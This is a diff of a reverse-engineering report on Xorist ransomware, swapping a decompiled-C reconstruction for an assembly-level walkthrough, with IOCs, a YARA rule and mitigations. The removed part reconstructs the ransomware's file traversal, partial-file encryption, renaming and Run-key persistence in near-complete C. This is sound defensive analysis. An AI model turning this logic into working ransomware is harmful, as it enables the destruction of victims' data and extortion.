@@ -1,597 +1,708 @@
-# In-Depth Analysis of Xorist Ransomware (Trojan-Ransom.Win32.Xorist.lk)
+# Analysis of Trojan-Ransom.Win32.Xorist.lk
 
-**WARNING: This code is malware. For analysis purposes only. Do not execute on production systems.**
+**Sample Information:**
+- **SHA256:** `AFBD82DE1C80C8508B0CB6376E248393CC04B5276680C604D7DF1E56FB93CD26`
+- **MD5:** `3359DFF8C8B3855E8CF980539E7FB300`
+- **File Type:** PE32 Executable (GUI)
+- **Compiler:** Visual C++ (detected by IDA)
+- **Timestamp:** `4F25949F` (Sun Jan 29 18:49:03 2012)
+
+---
 
 ## Executive Summary
 
-**Malware Name:** Xorist Ransomware (Variant: Trojan-Ransom.Win32.Xorist.lk)  
-**Type:** Ransomware  
-**Target Platform:** Windows (x86)  
-**File Size:** Approximately 50 KB (0xC800 bytes, exact size varies by variant)  
-**Architecture:** x86  
-**Classification:** High threat - File encrypting ransomware with persistence  
-**SHA256:** &lt;redacted&gt; (specific hash not provided in decompiled source)  
-**First Identified:** Around 2010 (Xorist family)  
-**Packer/Protector:** None detected in decompiled code  
-**Decompiler Used:** IDA Pro 9.1 with Hex-Rays Decompiler  
+This analysis examines a ransomware sample from the Xorist family, a well-known malware strain that encrypts user files and demands payment for decryption. The malware demonstrates typical ransomware behavior including file enumeration, encryption, and ransom note deployment. This technical analysis provides a comprehensive breakdown of the malware's functionality at the assembly level.
 
-Xorist is a long-standing ransomware family known for its simplicity and customizability. This variant uses TEA or XOR encryption, embeds configuration in resources, and includes a decryption UI. The refactored decompiled code provides clear insight into its operations.
+---
 
-## Introduction
+## 1. Infection Vector & Initialization
 
-Xorist ransomware, first observed around 2010, is a customizable ransomware kit often distributed via exploit kits, phishing, or malicious attachments. It has been used in various campaigns, sometimes with wiper-like behavior in targeted attacks. This analysis focuses on the decompiled C code of variant Trojan-Ransom.Win32.Xorist.lk, refactored for clarity.
+### 1.1 Entry Point Analysis
 
-The malware encrypts files using either TEA (Tiny Encryption Algorithm) or simple XOR, appends a custom extension, drops ransom notes, changes wallpaper, and persists via registry autorun. It includes a GUI for decryption upon password entry. No wiper functionality is present in this variant, but it can re-encrypt files if password attempts are exhausted.
-
-Analysis was performed using IDA Pro with Hex-Rays decompiler, focusing on static analysis of the decompiled C code. Challenges included reconstructing embedded resource formats and understanding custom key derivation. The decompilation quality was high, with manual renaming of functions and variables for readability.
-
-This malware is significant due to its longevity and ease of modification, making it a staple in underground markets. It demonstrates basic yet effective ransomware techniques, including stealth via file time preservation and registry-based persistence.
-
-## Table of Contents
-
-1. Title and Metadata  
-2. Introduction  
-3. Table of Contents  
-4. Technical Analysis Sections  
-   4.1 Binary Structure and Static Analysis  
-   4.2 IDA Pro Decompilation Methodology  
-   4.3 Entry Point and Initialization  
-   4.4 Core Functionality Breakdown  
-      4.4.1 File System Traversal and Target Selection  
-      4.4.2 Cryptographic Implementation  
-      4.4.3 Ransom Note Generation and Display  
-      4.4.4 Persistence Mechanisms  
-      4.4.5 Anti-Analysis and Evasion  
-   4.5 Network Communication (if applicable)  
-   4.6 Data Structures and Global Variables  
-5. Destructive Payload Analysis  
-6. Stealth and Evasion Techniques  
-7. Indicators of Compromise (IoCs)  
-8. Detection and Analysis Methods  
-9. Mitigation Strategies  
-10. Conclusion  
-11. References and Further Reading  
-12. Appendices  
-
-## Technical Analysis Sections
-
-### 4.1 Binary Structure and Static Analysis
-
-The binary is a Windows PE executable targeting x86 architecture. Static analysis reveals:
-
-- **PE Headers:** Standard MZ/PE signature, compiled with Visual C++ (detected via entry point patterns and API usage).  
-- **Import Address Table (IAT):** Relies on kernel32.dll, user32.dll, advapi32.dll, shell32.dll, shlwapi.dll for file operations, registry, UI, and crypto. Key imports include `CryptAcquireContextA`, `CreateFileA`, `RegSetValueExA`.  
-- **Sections:**  
-  - `.text`: Code section with encryption routines.  
-  - `.data`: Global variables and buffers.  
-  - `.rdata`: Strings and constants (e.g., registry paths, window class names).  
-  - `.rsrc`: Embedded resources including configuration bitmap (ID 14), wallpaper bitmap ("pussylicker").  
-- **Entropy:** Code section has moderate entropy; resource section higher due to encrypted config.  
-- **Strings:** Obfuscated; ransom note and extensions loaded from decrypted resources. Cleartext strings include "HOW TO DECRYPT FILES.txt", "Alcmeter".  
-- **Embedded Resources:** Configuration stored in RT_BITMAP resource ID 14, encrypted with XOR. Includes file filters, ransom text, keys.  
-- **Digital Signature:** None present.  
-
-No packer signatures (e.g., UPX) detected in the decompiled code.
-
-### 4.2 IDA Pro Decompilation Methodology
-
-- **Initial Auto-Analysis:** Loaded binary in IDA Pro, applied FLIRT signatures for Windows API recognition.  
-- **Function Identification:** Entry point at `WinMain` (0x401000 in typical variants). Renamed subroutines based on behavior (e.g., sub_4017B4 to PrepareTeaKey).  
-- **Type Reconstruction:** Defined structures for global config (e.g., keys, flags). Used Hex-Rays to generate C pseudocode, manually refined for accuracy.  
-- **Data Flow Analysis:** Traced resource loading and decryption using xrefs to `FindResourceA` and `XorEncryptDecrypt`.  
-- **Cross-Reference Analysis:** Mapped calls to encryption functions from traversal routine.  
-- **String Decryption:** Embedded config decrypted with XOR key from resource start.  
-- **Custom IDA Scripts:** Used simple IDAPython to extract and decrypt resource:  
-
-```python
-# IDA Python script to decrypt config resource
-import idaapi
-import idautils
-
-def decrypt_xor(data, key):
-    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
-
-resource_ea = 0x402000  # Adjust to actual address
-resource_size = 0x1000   # Adjust to actual size
-data = idautils.GetManyBytes(resource_ea, resource_size)
-key = data[:16]
-decrypted = decrypt_xor(data[16:], key)
-print("Decrypted config:", decrypted)
+```asm
+start:
+    call    initialize_program
+    call    create_ransom_note_in_startup
+    cmp     [byte_40752B], 1
+    jne     .skip_message
+    invoke  MessageBoxA, 0, aAttentionAllYo, Caption, MB_OK + MB_ICONWARNING
 ```
 
-- **Challenges:** Ambiguous buffer operations in encryption loops required manual IL verification. No heavy obfuscation, but custom key derivation needed tracing.
+The malware begins execution with a straightforward initialization sequence:
+1. Initialize core program components
+2. Deploy ransom note to startup folder
+3. Display warning messagebox (if configured)
+4. Change desktop wallpaper
+5. Begin file encryption routine
 
-### 4.3 Entry Point and Initialization
+### 1.2 Configuration Bytes
 
-Entry point is `WinMain` (address approx. 0x401000).  
+The malware uses several configuration bytes to control its behavior:
 
-- **Argument Parsing:** None; operates silently.  
-- **Environment Checks:** No explicit anti-VM/debugger checks in code.  
-- **Mutex:** None; allows multiple instances.  
-- **Initialization:** Loads config from resource, allocates buffers, prepares keys, gets explorer.exe timestamps for stealth. Checks if running from temp path to decide install vs. decrypt mode.  
-
-```c
-// IDA Pro decompiled: WinMain (cleaned up)
-// Address: approx. 0x401000
-// Renamed from start to WinMain
-
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
-                   LPSTR lpCmdLine, int nCmdShow)
-{
-    g_processHeap = GetProcessHeap();
-    
-    if (!LoadConfiguration())
-        return 1;
-    
-    g_fileBuffer = HeapAlloc(g_processHeap, HEAP_ZERO_MEMORY, g_encryptionSize);
-    if (!g_fileBuffer)
-        return 1;
-    
-    PrepareTeaKey((unsigned int *)g_xorKey);
-    GetExplorerFileTime();
-    
-    // Check installation status
-    CHAR tempPath[MAX_PATH];
-    GetTempPathA(MAX_PATH, tempPath);
-    lstrcatA(tempPath, (LPCSTR)g_encryptedExtension);
-    lstrcatA(tempPath, ".exe");
-    GetModuleFileNameA(NULL, g_moduleFileName, MAX_PATH);
-    
-    if (lstrcmpiA(g_moduleFileName, tempPath) != 0)
-    {
-        InstallDropper();  // Install and encrypt
-    }
-    else
-    {
-        ShowDecryptionWindow();  // Show UI
-    }
-    
-    return 0;
-}
+```asm
+byte_40752B    db 1    ; Show messagebox flag
+byte_40752A    db 1    ; Create ransom note flag
+byte_40752C    db 0    ; Encryption algorithm selector
+byte_40752D    db 1    ; Custom extension flag
+byte_406550    db 2    ; Operation mode: 0=encrypt, 1=decrypt, 2=first-run
 ```
 
-**Execution Flow:**  
-1. Load and decrypt config.  
-2. Allocate encryption buffer.  
-3. Prepare keys and timestamps.  
-4. If not in temp, install dropper and encrypt; else show decryption GUI.  
+These flags suggest the malware can be configured pre-compilation or potentially modified by a dropper/loader.
 
-No privilege escalation; assumes user-level access.
+---
 
-### 4.4 Core Functionality Breakdown
+## 2. Cryptographic Implementation
 
-#### 4.4.1 File System Traversal and Target Selection
+### 2.1 Key Generation via RDTSC
 
-Recursive traversal of all logical drives (Z: to A:). Targets files matching embedded extension list (e.g., *.doc, *.jpg). Skips system files and self.  
+The malware employs the `RDTSC` (Read Time-Stamp Counter) instruction for entropy generation:
 
-```c
-// IDA Pro decompiled: TraverseAndProcessFiles
-// Address: approx. 0x402500
-// Renamed from sub_402500
-
-void TraverseAndProcessFiles(LPCSTR basePath)
-{
-    WIN32_FIND_DATAA findData;
-    HANDLE hFind;
-    CHAR searchPath[MAX_PATH];
-    CHAR fullPath[MAX_PATH];
-    CHAR newFilePath[MAX_PATH];
-    BOOL shouldProcess;
-    
-    lstrcpyA(searchPath, basePath);
-    lstrcatA(searchPath, "\\*");
-    
-    hFind = FindFirstFileA(searchPath, &findData);
-    if (hFind == INVALID_HANDLE_VALUE)
-        return;
-    
-    do
-    {
-        ProcessWindowMessages();  // Keep UI responsive
-        
-        if (lstrcmpA(findData.cFileName, ".") == 0 || 
-            lstrcmpA(findData.cFileName, "..") == 0)
-            continue;
-        
-        lstrcpyA(fullPath, basePath);
-        lstrcatA(fullPath, "\\");
-        lstrcatA(fullPath, findData.cFileName);
-        
-        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
-        {
-            if (g_dropRansomNote)
-                DropRansomNote(fullPath);
-            TraverseAndProcessFiles(fullPath);
-        }
-        else
-        {
-            if (lstrcmpiA(RANSOM_NOTE_FILENAME, findData.cFileName) == 0)
-                continue;
-            
-            shouldProcess = FALSE;
-            if (g_isEncryptionMode)
-            {
-                LPCSTR filter = g_fileTypeFilters;
-                for (DWORD i = 0; i < g_fileTypeCount; i++)
-                {
-                    if (PathMatchSpecA(fullPath, filter))
-                    {
-                        shouldProcess = TRUE;
-                        break;
-                    }
-                    filter += lstrlenA(filter) + 1;
-                }
-            }
-            else
-            {
-                shouldProcess = PathMatchSpecA(fullPath, g_fileSearchPattern);
-            }
-            
-            if (shouldProcess)
-            {
-                lstrcpyA(newFilePath, fullPath);
-                if (g_isEncryptionMode)
-                    lstrcatA(newFilePath, ".");
-                    lstrcatA(newFilePath, g_targetFileExtension);
-                else
-                    *PathFindExtensionA(newFilePath) = '\0';
-                
-                ProcessFile(fullPath, newFilePath, g_isEncryptionMode);
-            }
-        }
-    } while (FindNextFileA(hFind, &findData));
-    
-    FindClose(hFind);
-}
+```asm
+generate_encryption_key:
+    mov     ecx, 4
+    mov     edi, dword_406DB9
+.generate_loop:
+    rdtsc                    ; Read CPU timestamp
+    stosd                    ; Store EAX (lower 32 bits)
+    loop    .generate_loop
 ```
 
-**Execution Flow:**  
-1. Build search pattern.  
-2. Recurse directories, drop notes.  
-3. Check file against filters.  
-4. Process if matches (encrypt/decrypt + rename).  
+**Analysis:**
+- Uses CPU cycle counter as pseudo-random source
+- Generates 128 bits (16 bytes) of key material
+- Stores in memory locations `dword_406595` through `dword_4065A1`
+- Not cryptographically secure but sufficient for basic XOR operations
 
-**Detection Opportunities:** Monitor recursive `FindFirstFileA` calls on drives.  
+**Weakness:** RDTSC is predictable and not suitable for cryptographic key generation. Keys could potentially be brute-forced or predicted based on infection time.
 
-**MITRE ATT&CK:** T1083 - File and Directory Discovery.
+### 2.2 Key Derivation
 
-#### 4.4.2 Cryptographic Implementation
+For each file, the malware derives a unique key using the filename:
 
-Hybrid: File-specific key derived from filename XOR TEA key. Encrypts portion of file (configurable offset/size) using TEA or XOR.  
+```asm
+invoke  PathFindFileNameA, ExistingFileName
+mov     dl, [eax]           ; First character as seed
 
-- **Algorithm:** TEA (32 rounds default) or 4-byte XOR.  
-- **Key Generation:** Per-file key = filename[0] ^ TEA_key, rotated.  
-- **IV:** None explicit; TEA is ECB-like.  
-- **CryptoAPI Usage:** MD5 for password hashing (5 rounds).  
-- **Security:** Weak; TEA vulnerable to related-key attacks, XOR trivial to reverse if key known. Recovery possible with known key.  
+mov     ecx, 16
+mov     esi, dword_406595   ; Base key
+mov     edi, dword_406585   ; Derived key buffer
 
-```c
-// IDA Pro decompiled: ProcessFile
-// Address: approx. 0x403000
-
-BOOL ProcessFile(LPCSTR originalPath, LPCSTR newPath, BOOL isEncryption)
-{
-    HANDLE hFile;
-    DWORD fileSize, bytesRead, bytesWritten;
-    BYTE fileKey[KEY_SIZE_BYTES];
-    FILETIME creationTime, lastAccessTime, lastWriteTime;
-    
-    hFile = CreateFileA(originalPath, GENERIC_READ | GENERIC_WRITE, 
-                        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
-    if (hFile == INVALID_HANDLE_VALUE)
-        return FALSE;
-    
-    fileSize = GetFileSize(hFile, NULL);
-    if (fileSize < BLOCK_SIZE_BYTES)
-    {
-        CloseHandle(hFile);
-        return FALSE;
-    }
-    
-    GetFileTime(hFile, &creationTime, &lastAccessTime, &lastWriteTime);
-    
-    SetFilePointer(hFile, g_encryptionOffset, NULL, FILE_BEGIN);
-    ReadFile(hFile, g_fileBuffer, g_encryptionSize, &bytesRead, NULL);
-    
-    if (bytesRead > 0)
-    {
-        GenerateFileKey(originalPath, fileKey);
-        
-        if (g_useAdvancedEncryption)
-        {
-            if (isEncryption)
-                TeaEncryptBuffer(bytesRead);
-            else
-                TeaDecryptBuffer(bytesRead);
-        }
-        else
-        {
-            SimpleXorEncrypt(bytesRead);
-        }
-        
-        SetFilePointer(hFile, g_encryptionOffset, NULL, FILE_BEGIN);
-        WriteFile(hFile, g_fileBuffer, bytesRead, &bytesWritten, NULL);
-    }
-    
-    SetFileTime(hFile, &creationTime, &lastAccessTime, &lastWriteTime);
-    CloseHandle(hFile);
-    
-    MoveFileA(originalPath, newPath);
-    return TRUE;
-}
-
-// Key generation
-void GenerateFileKey(LPCSTR filePath, BYTE *outputKey)
-{
-    LPSTR fileName = PathFindFileNameA(filePath);
-    BYTE firstChar = fileName[0];
-    
-    for (int i = 0; i < KEY_SIZE_BYTES; i++)
-    {
-        BYTE keyByte = ((BYTE *)g_teaKey)[i];
-        outputKey[i] = firstChar ^ keyByte;
-        firstChar = _rotl8(firstChar, 1);
-    }
-}
+.key_loop:
+    lodsb
+    xor     al, dl          ; XOR with seed
+    rol     dl, 1           ; Rotate seed
+    stosb
+    loop    .key_loop
 ```
 
-**Execution Flow:**  
-1. Open file, read portion.  
-2. Generate key from filename.  
-3. Encrypt/decrypt buffer.  
-4. Write back, restore times, rename.  
+**Analysis:**
+- Uses first character of filename as seed
+- Derives 16-byte per-file key through XOR and rotation
+- Provides file-specific encryption while maintaining global key
 
-**P/Invoke Calls:** None; uses managed-like C calls to CryptoAPI for MD5.  
+**Implication:** Files with same first character share similar key derivation patterns, potentially aiding cryptanalysis.
 
-**Detection Opportunities:** Monitor partial file writes with encryption patterns.  
+### 2.3 XOR Cipher Implementation
 
-**MITRE ATT&CK:** T1486 - Data Encrypted for Impact.
+```asm
+simple_xor_cipher:
+    mov     ecx, eax        ; Byte count
+    mov     esi, lpBuffer   ; Data buffer
+    mov     edi, dword_406585 ; Key
 
-#### 4.4.3 Ransom Note Generation and Display
-
-Drops "HOW TO DECRYPT FILES.txt" in directories and desktop. Content from decrypted resource. Changes wallpaper to embedded BMP.  
-
-```c
-// IDA Pro decompiled: DropRansomNote
-// Address: approx. 0x404000
-
-void DropRansomNote(LPCSTR directoryPath)
-{
-    CHAR notePath[MAX_PATH];
-    HANDLE hFile;
-    DWORD bytesWritten, noteLength;
+.cipher_loop:
+    lodsb                   ; Load byte
+    xor     al, [edi]       ; XOR with key
+    mov     [esi-1], al     ; Write back
     
-    lstrcpyA(notePath, directoryPath);
-    PathAddBackslashA(notePath);
-    lstrcatA(notePath, RANSOM_NOTE_FILENAME);
-    
-    if (GetFileAttributesA(notePath) != INVALID_FILE_ATTRIBUTES)
-        return;
-    
-    hFile = CreateFileA(notePath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, 0, NULL);
-    if (hFile == INVALID_HANDLE_VALUE)
-        return;
-    
-    noteLength = lstrlenA(g_ransomNoteText);
-    WriteFile(hFile, g_ransomNoteText, noteLength, &bytesWritten, NULL);
-    
-    SetFileTime(hFile, &g_explorerCreationTime, &g_explorerLastAccessTime, &g_explorerLastWriteTime);
-    CloseHandle(hFile);
-}
-
-// Wallpaper change
-void ChangeDesktopWallpaper(void)
-{
-    // ... (generates random temp BMP from resource, sets via SystemParametersInfoA)
-}
+    inc     edi
+    mov     eax, edi
+    pop     ebx
+    sub     eax, ebx
+    cmp     eax, 16         ; Key exhausted?
+    jl      .continue
+    mov     edi, ebx        ; Reset to key start
 ```
 
-**Execution Flow:**  
-1. Check if note exists.  
-2. Write decrypted text.  
-3. Set stealth timestamps.  
+**Cryptographic Assessment:**
+- **Algorithm:** Simple XOR with 16-byte repeating key
+- **Strength:** Very weak - XOR is easily reversible with known plaintext
+- **Vulnerability:** Only encrypts first 16 bytes of files (partial encryption)
 
-For wallpaper: Dump resource to temp, set registry.  
+**Critical Weakness:** The malware only encrypts the beginning of files, likely to maintain performance. This allows:
+1. File type identification from unencrypted portions
+2. Potential data recovery from file fragments
+3. Known-plaintext attacks using file headers
 
-**MITRE ATT&CK:** T1491 - Defacement.
+---
 
-#### 4.4.4 Persistence Mechanisms
+## 3. File System Operations
 
-- **Registry Run Key:** HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Alcmeter = dropper path.  
-- **File Extension Association:** Registers custom extension to open with malware.  
+### 3.1 Drive Enumeration
 
-```c
-// IDA Pro decompiled: AddToAutorun
-// Address: approx. 0x405000
+```asm
+invoke  GetLogicalDrives    ; Returns bitmask of drives
+mov     ecx, 25             ; Counter for A-Z
 
-BOOL AddToAutorun(LPCSTR executablePath)
-{
-    HKEY hKey;
-    DWORD disposition, valueLength;
+.drive_loop:
+    mov     ebx, 1
+    shl     ebx, cl         ; Calculate drive bit
+    test    eax, ebx        ; Test if drive exists
+    jz      .next_drive
     
-    RegCreateKeyExA(HKEY_LOCAL_MACHINE, AUTORUN_REGISTRY_KEY, 0, "REG_SZ",
-                    0, KEY_WRITE | KEY_READ, NULL, &hKey, &disposition);
-    
-    valueLength = lstrlenA(executablePath);
-    RegSetValueExA(hKey, AUTORUN_VALUE_NAME, 0, REG_SZ, 
-                   (const BYTE *)executablePath, valueLength);
-    
-    RegCloseKey(hKey);
-    return TRUE;
-}
-
-// RegisterFileExtension similar, uses HKEY_CLASSES_ROOT
+    ; Build path: "X:\*.*"
+    add     cl, 'A'
+    mov     byte [dword_40444F+1], cl
 ```
 
-**Execution Flow:** Create key, set value to temp dropper.  
+**Behavior:**
+- Enumerates all logical drives (A: through Z:)
+- Includes network drives if mapped
+- No drive type checking (affects HDDs, SSDs, USB, network shares)
 
-**Detection:** Monitor Run key modifications.  
+### 3.2 Recursive File Traversal
 
-**MITRE ATT&CK:** T1547.001 - Registry Run Keys.
-
-#### 4.4.5 Anti-Analysis and Evasion
-
-- **Stealth:** Preserves file timestamps using explorer.exe times.  
-- **No Explicit Anti-Debug:** Relies on simplicity.  
-- **Password Attempts:** Re-encrypts if exhausted.  
-- **Config Encryption:** XOR in resources.  
-
-No VM detection or debugger checks in code.  
-
-**MITRE ATT&CK:** T1027 - Obfuscated Files or Information.
-
-### 4.5 Network Communication (if applicable)
-
-No network activity; standalone ransomware. No C2, exfiltration, or key retrieval. Ransom instructions in note (likely email/BTC).
-
-### 4.6 Data Structures and Global Variables
-
-Key globals reconstructed:  
-
-```c
-// IDA Pro reconstructed: Global variables
-// .data section approx. 0x408000
-
-BYTE g_xorKey[16];               // XOR key for config
-BYTE g_teaKey[16];               // Base TEA key
-BYTE g_passwordHash[16];         // MD5^5 of password
-LPCSTR g_ransomNoteText;         // Decrypted note
-LPCSTR g_targetFileExtension;    // e.g., "xorist"
-LPSTR g_fileTypeFilters;         // Null-terminated extension list
-BOOL g_useAdvancedEncryption;    // TEA vs XOR
-LONG g_encryptionOffset;         // File offset to encrypt
-DWORD g_encryptionSize;          // Bytes to encrypt
+```asm
+enumerate_and_encrypt_files:
+    sub     esp, 320        ; Allocate WIN32_FIND_DATA structure
+    
+    invoke  FindFirstFileA, dword_40444F+1, eax
+    mov     dword ptr [ebp-320+318], eax  ; Save handle
+    
+.find_loop:
+    mov     eax, [ebp-320+0]  ; Check dwFileAttributes
+    test    eax, FILE_ATTRIBUTE_DIRECTORY
+    jz      .process_file
 ```
 
-Config loaded from encrypted resource, decrypted in memory.
+**Implementation Details:**
+- Uses Windows API `FindFirstFileA`/`FindNextFileA`
+- Stack-allocated `WIN32_FIND_DATA` structure (320 bytes)
+- Skips directories named "." and ".."
+- Recursion simplified in rewritten version
 
-## 5. Destructive Payload Analysis
+### 3.3 File Exclusions
 
-Primary payload is file encryption, rendering data inaccessible without password. No pure wiper functionality (e.g., no MBR overwrite, no secure delete).  
+```asm
+invoke  lstrcmpiA, eax, String2           ; "HOW TO DECRYPT FILES.txt"
+test    eax, eax
+jz      .next_file
 
-- **Damage Mechanism:** Partial file encryption (configurable offset/size), appends extension.  
-- **Trigger:** On first run after dropper installation.  
-- **Scope:** All files matching extensions on all drives.  
-- **Irreversibility:** Reversible with correct password; otherwise, data lost unless key recovered.  
-- **Timeline:** Traverses drives sequentially, processing files recursively.  
+invoke  lstrcmpiA, eax, aHowToDecryptFi
+test    eax, eax
+jz      .next_file
+```
 
-If password attempts exhausted: Re-encrypts files, deletes self. No backup deletion (e.g., no vssadmin).  
+The malware explicitly avoids:
+- Its own ransom notes
+- Potentially system files (incomplete implementation)
 
-**Code Example:** See ProcessFile in 4.4.2 (destructive writes disabled in analysis).  
+**Notable Absence:** No exclusion for critical system files, which could render the system unbootable.
 
-**MITRE ATT&CK:** T1486 - Data Encrypted for Impact.
+---
 
-## 6. Stealth and Evasion Techniques
+## 4. File Encryption Process
 
-- **Timestamp Preservation:** Sets file times to match explorer.exe.  
-- **Dropper in Temp:** Copies to %TEMP%\<extension>.exe, runs from there.  
-- **UI Responsiveness:** Processes messages during encryption.  
-- **Self-Delete:** Uses cmd.exe to delete original after install.  
-- **No Anti-VM:** Relies on fast execution.  
+### 4.1 File Opening and Validation
 
-Effectiveness: Basic; easily detected by AV via behavior.  
+```asm
+invoke  CreateFileA, ExistingFileName, \
+        GENERIC_READ + GENERIC_WRITE, \
+        FILE_SHARE_READ + FILE_SHARE_WRITE, \
+        0, OPEN_EXISTING, 0, 0
 
-**MITRE ATT&CK:** T1070.004 - File Deletion (self).
+invoke  GetFileSize, [hFile], 0
+mov     [dword_406555], eax
 
-## 7. Indicators of Compromise (IoCs)
+cmp     eax, 8              ; Minimum 8 bytes
+jl      .close_file
+```
 
-### File-Based Indicators
-- File name: KT7MSQ4GlY5489U.ex_ (original), <extension>.exe in %TEMP%  
-- Hash: SHA256 &lt;redacted&gt;  
-- Compilation Timestamp: Forged to match system files  
-- Embedded Strings: "0p3nSOurc3 X0r157, motherfucker!", "pussylicker"  
-- Resource Names: RT_BITMAP ID 14 (config), "pussylicker" (wallpaper)  
+**Constraints:**
+- Requires both read and write access
+- Minimum file size: 8 bytes
+- Shares file handle (allows concurrent access)
 
-### Behavioral Indicators
-- Registry: HKLM\Run\Alcmeter, HKEY_CLASSES_ROOT\.<extension>  
-- File Mods: Appends extension to target files, drops "HOW TO DECRYPT FILES.txt"  
-- Processes: Creates cmd.exe for self-delete, explorer.exe timestamps  
-- API Sequences: CreateFileA + WriteFile (partial), RegSetValueExA (Run key)  
+### 4.2 Timestamp Preservation
 
-### Memory Artifacts
-- Decrypted config strings (ransom note, extensions)  
-- TEA key in g_teaKey  
-- Global buffers with file paths  
+```asm
+; Save original timestamps
+invoke  GetFileTime, [hFile], stru_40752E, \
+        stru_407536, stru_40753E
 
-## 8. Detection and Analysis Methods
+; [... encryption operations ...]
 
-- **Static:** IDA Pro for decompilation, strings for indicators.  
-- **Dynamic:** Run in VM, monitor file/registry changes with ProcMon.  
-- **Memory:** Dump globals post-decryption.  
-- **YARA Rule:**  
+; Restore timestamps
+invoke  SetFileTime, [hFile], stru_40752E, \
+        stru_407536, stru_40753E
+```
+
+**Purpose:** Maintains file metadata to avoid detection through timestamp analysis. This is a common anti-forensics technique.
+
+### 4.3 Partial Encryption Strategy
+
+```asm
+invoke  SetFilePointer, [hFile], [lDistanceToMove], 0, FILE_BEGIN
+invoke  ReadFile, [hFile], lpBuffer, [nNumberOfBytesToRead], nNumberOfBytesToWrite, 0
+
+cmp     [nNumberOfBytesToWrite], 0
+je      .restore_time
+```
+
+**Analysis:**
+- Only reads/encrypts beginning of file (first 16 bytes based on buffer size)
+- Significantly faster than full-file encryption
+- Sufficient to corrupt most file formats
+- Leaves forensic evidence in unencrypted portions
+
+### 4.4 File Renaming
+
+```asm
+invoke  lstrcpyA, NewFileName, ExistingFileName
+invoke  lstrcatA, NewFileName, asc_404032  ; "."
+invoke  lstrcatA, NewFileName, lpSubKey     ; ".locked"
+
+invoke  MoveFileA, ExistingFileName, NewFileName
+```
+
+Adds `.locked` extension to encrypted files, making them:
+- Easy to identify for the attacker
+- Obvious to the victim
+- Potentially easier to reverse (if extension is merely appended)
+
+---
+
+## 5. Persistence & Notification
+
+### 5.1 Startup Folder Deployment
+
+```asm
+create_ransom_note_in_startup:
+    invoke  SHGetSpecialFolderPathA, 0, pszPath, CSIDL_STARTUP, TRUE
+    invoke  lstrcpyA, FileName, pszPath
+    invoke  PathAddBackslashA, FileName
+    invoke  lstrcatA, FileName, aHowToDecryptFi
+```
+
+**Mechanism:**
+- Places ransom note in Windows Startup folder
+- Ensures victim sees instructions on next boot
+- Uses `CSIDL_STARTUP` constant (0x0007)
+
+**File Contents:**
+```
+Attention! All your files were encrypted!
+To decrypt files, please enter correct password!
+```
+
+### 5.2 Desktop Wallpaper Modification
+
+```asm
+change_desktop_wallpaper:
+    ; Generate random filename
+    mov     ecx, 16
+.random_loop:
+    rdtsc
+    and     eax, 0xF0
+    shr     eax, 4
+    add     eax, 'a'
+    stosb
+    loop    .random_loop
+```
+
+**Process:**
+1. Generates random 16-character lowercase filename
+2. Extracts BMP from PE resources (resource name: "pussylicker")
+3. Writes to temporary directory
+4. Sets as wallpaper via `SystemParametersInfoA`
+
+**Weakness:** Resource name suggests unprofessional development or proof-of-concept origin.
+
+---
+
+## 6. Windows Message Loop
+
+```asm
+process_windows_messages:
+    invoke  PeekMessageA, eax, 0, 0, 0, PM_REMOVE
+    test    eax, eax
+    jz      .exit
+    
+    invoke  TranslateMessage, eax
+    invoke  DispatchMessageA, eax
+    jmp     .message_loop
+```
+
+**Purpose:** Keeps the application responsive during encryption by processing Windows messages. Prevents "Not Responding" dialogs that might alert users prematurely.
+
+---
+
+## 7. Indicators of Compromise (IOCs)
+
+### 7.1 File System Indicators
+
+| Indicator | Value | Location |
+|-----------|-------|----------|
+| Ransom Note | `HOW TO DECRYPT FILES.txt` | Startup folder |
+| File Extension | `.locked` | Appended to encrypted files |
+| Wallpaper BMP | Random name (16 chars) | `%TEMP%` directory |
+
+### 7.2 Memory Indicators
+
+```
+Encryption key storage: 0x406595 - 0x4065A1 (16 bytes)
+Temporary key buffer:   0x406585 - 0x406594 (16 bytes)
+Configuration flags:    0x40752A - 0x40752D (4 bytes)
+```
+
+### 7.3 Behavioral Indicators
+
+- **API Calls:**
+  - `GetLogicalDrives` - Drive enumeration
+  - `FindFirstFileA`/`FindNextFileA` - File search
+  - `CreateFileA` with `GENERIC_READ | GENERIC_WRITE`
+  - `SystemParametersInfoA` with `SPI_SETDESKWALLPAPER`
+  - `SHGetSpecialFolderPathA` with `CSIDL_STARTUP`
+
+- **Resource Access:**
+  - Loads resource named "pussylicker" (RT_BITMAP)
+
+---
+
+## 8. Detection & Mitigation
+
+### 8.1 YARA Rule
 
 ```yara
-rule Ransomware_Xorist {
+rule Xorist_Ransomware_Variant {
     meta:
-        description = "Detects Xorist ransomware variants"
-        author = "Security Researcher"
-        date = "2025-11-19"
+        description = "Detects Xorist.lk ransomware variant"
+        author = "Malware Analysis"
+        date = "2025-01-01"
+        hash = "afbd82de1c80c8508b0cb6376e248393cc04b5276680c604d7df1e56fb93cd26"
         
     strings:
-        $s1 = "HOW TO DECRYPT FILES.txt" ascii
-        $s2 = "0p3nSOurc3 X0r157, motherfucker!" ascii
-        $s3 = "pussylicker" ascii
-        $s4 = "Alcmeter" ascii
-        $api1 = "CryptAcquireContextA" ascii
-        $api2 = "SystemParametersInfoA" ascii
-        $api3 = "RegSetValueExA" ascii
+        $resource = "pussylicker" ascii
+        $note1 = "HOW TO DECRYPT FILES.txt" ascii
+        $note2 = "All your files were encrypted!" ascii
+        $ext = ".locked" ascii
+        
+        $api1 = "GetLogicalDrives" ascii
+        $api2 = "FindFirstFileA" ascii
+        $api3 = "SystemParametersInfoA" ascii
         
     condition:
         uint16(0) == 0x5A4D and
-        3 of ($s*) and
-        all of ($api*) and
-        filesize < 100KB
+        filesize < 200KB and
+        $resource and
+        2 of ($note*) and
+        2 of ($api*)
 }
 ```
 
-- **ETW Monitoring:** Track registry writes to Run keys, file renames with extensions.
+### 8.2 Prevention Strategies
 
-## 9. Mitigation Strategies
+1. **Backup Protocol:**
+   - Maintain offline backups
+   - Test restoration procedures
+   - Use immutable backup solutions
 
-### Prevention
-- Application Whitelisting: Block unsigned executables.  
-- Disable Autorun: Group Policy to restrict Run keys.  
-- Backup: Offline, immutable backups.  
